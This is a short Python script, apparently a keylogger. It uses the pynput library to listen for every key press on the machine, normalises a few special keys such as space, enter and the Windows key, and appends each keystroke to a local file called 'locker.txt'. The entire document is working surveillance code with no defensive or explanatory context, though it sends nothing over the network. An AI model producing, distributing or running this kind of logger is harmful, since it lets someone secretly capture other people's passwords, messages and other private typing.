from pynput.keyboard import Listener


def save(key):
    keydata=str(key)
    keydata=keydata.replace("'","")

    if keydata=="Key.space":
        keydata=" "
    if keydata=="Key.shift": 
        keydata=""
    if keydata=="Key.cmd": 
        keydata="Win "    
    if keydata=="Key.enter":
        keydata="\n"
    with open("locker.txt","a") as a:
        a.write(keydata)


with Listener(on_press=save) as b:
    b.join()
